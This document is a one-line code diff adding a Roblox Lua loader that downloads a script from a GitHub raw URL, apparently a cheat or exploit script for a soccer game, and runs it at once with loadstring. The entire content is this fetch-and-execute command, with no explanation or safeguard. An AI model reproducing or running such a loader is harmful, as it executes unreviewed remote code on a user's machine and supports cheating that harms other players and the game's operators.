@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/the-classic-soccer-spam7-ld06fkpno1v8p0.lua"))()
